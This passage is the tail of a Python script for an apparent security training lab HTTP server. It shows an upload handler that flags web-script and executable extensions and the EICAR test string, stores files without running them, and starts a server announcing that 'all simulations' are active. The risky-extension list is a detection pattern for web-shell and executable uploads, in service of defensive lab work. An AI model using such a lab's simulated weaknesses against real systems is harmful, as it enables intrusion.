            ".php",".php5",".phtml",".jsp",".aspx",".sh",".py",".exe")

        append_event("upload", "stored",
                     "file=%s bytes=%d sha256=%s eicar=%s risky_ext=%s" % (
                         stored, len(data), sha256, eicar, risky_ext))

        self._send_json({"ok": True, "stored_name": stored, "size_bytes": len(data),
                         "sha256": sha256, "eicar_detected": eicar,
                         "risky_extension": risky_ext, "script_header": script_hd,
                         "note": "File stored under ./uploads — not executed"})

    # ------------------------------------------------------------------
    def log_message(self, fmt, *args):
        sys.stdout.write("%s - [%s] %s\n" % (
            self.address_string(),
            self.log_date_time_string(),
            fmt % args))


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    ensure_lab_data()
    append_event("server", "start", "lab initialized — all simulations active")
    server = HTTPServer((HOST, PORT), LabHandler)
    print("Serving security lab on http://0.0.0.0:%d" % PORT)
    print("Lab files : %s" % LAB_FILES_DIR)
    print("Uploads   : %s" % UPLOADS_DIR)
    print("Event log : %s" % LOG_PATH)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        append_event("server", "stop", "shutdown")
        server.server_close()
        print("Server stopped")
